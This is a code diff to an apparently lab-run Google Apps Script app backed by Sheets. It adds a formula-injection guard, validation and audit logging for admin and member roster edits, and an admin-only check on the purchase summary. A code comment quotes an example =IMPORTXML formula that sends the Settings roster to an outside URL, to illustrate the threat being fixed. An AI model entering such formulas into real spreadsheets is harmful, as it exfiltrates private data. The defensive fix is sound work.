@@ -907,6 +907,10 @@ function normalizeRow_(headers, row) {
     if (textFields.indexOf(h) >= 0 && typeof val !== "string") {
       val = val == null ? "" : String(val);
     }
+    // Undo serializeCell_'s formula guard. Sheets normally eats the apostrophe
+    // itself, so this usually finds nothing; doing it anyway means the value the
+    // app reads is the value it wrote, whichever way the API behaves.
+    if (typeof val === "string" && val.charAt(0) === "'" && FORMULA_LEAD_.test(val.slice(1))) val = val.slice(1);
     // Datetime fields — Sheets turns "YYYY-MM-DD HH:MM" into a Date object
     if (["out", "ret"].indexOf(h) >= 0) {
       if (val instanceof Date) val = ymd(val) + " " + hm(val);
@@ -971,9 +975,21 @@ function findRow(name, match) {
 }
 
 // Sheets cells hold scalars only, so arrays are serialized on the way in.
+//
+// Text that begins with = + - or @ is not text to a spreadsheet, it is a formula,
+// and it runs the moment somebody opens the file. An item named
+// =IMPORTXML("https://…?d="&JOIN(",",Settings!A1:B99),"//a") is a working
+// exfiltration of the admin roster, typed into the Add Item box by anyone who can
+// reach the app, and it lands in AuditLog and DeleteLog as well. A leading
+// apostrophe is Sheets' own "this is text" marker and is not part of the stored
+// value; normalizeRow_ strips one anyway if it comes back, so the round trip is
+// exact whichever way the API behaves.
+var FORMULA_LEAD_ = /^[=+\-@\t\r]/;
 function serializeCell_(header, val) {
   if (header === "usedBy" && Array.isArray(val)) return JSON.stringify(val);
-  return (val === undefined || val === null) ? "" : val;
+  if (val === undefined || val === null) return "";
+  if (typeof val === "string" && FORMULA_LEAD_.test(val)) return "'" + val;
+  return val;
 }
 
 // The sheet's own header row is authoritative for writes, not TABLE_HEADERS.
@@ -1488,7 +1504,27 @@ function doPost(e) {
     if (!admin) {
       return jsonResponse({ error: "Forbidden", detail: "Only admins can change settings" });
     }
+    // `admins` and `members` are the roster. Setting them from the app is allowed
+    // — an admin can already edit the sheet — but it was the one mutating action
+    // that left no trace, which is the wrong property for the setting that decides
+    // who is an admin. It is also easy to mistype: isAdmin swallows a parse error
+    // and returns false for everyone, so a stray character in the JSON strips
+    // every admin and only the spreadsheet can put them back.
+    const key = String(body.key || "");
+    if (key === "admins" || key === "members") {
+      let parsed;
+      try { parsed = JSON.parse(body.value); } catch (e) { parsed = null; }
+      if (!Array.isArray(parsed)) {
+        return jsonResponse({ error: "Bad value",
+          detail: '"' + key + '" has to be a JSON array of sign-in addresses, e.g. ["jdoe1@jh.edu"]' });
+      }
+      if (key === "admins" && normalizeEmails_(parsed).indexOf(userEmail) < 0) {
+        return jsonResponse({ error: "Bad value",
+          detail: "That list leaves you out, and nobody left in the app could put you back. Edit the Settings tab directly if you mean it." });
+      }
+    }
     writeSetting(body.key, body.value);
+    logAudit(userName, userEmail, "SaveSetting", key + " = " + String(body.value || "").slice(0, 200));
     return jsonResponse({ ok: true });
   }
 
@@ -1517,6 +1553,11 @@ function doPost(e) {
   // than storing data, so it deliberately bypasses the storage layer. On a
   // migration this becomes a generated file/export, not a ported function.
   if (action === "generatePurchaseSummary") {
+    // Rebuilds a shared tab of the lab's spreadsheet from whatever the caller
+    // sends, deleting what was there. That is an admin's artifact, not a member's
+    // — and the button that reaches it sits beside Digest and Backup, which are
+    // both admin-only already.
+    if (!admin) return jsonResponse({ error: "Forbidden", detail: "Only admins can write the purchase summary sheet" });
     var orders = body.orders || [];
     if (orders.length === 0) return jsonResponse({ error: "No orders provided" });
 
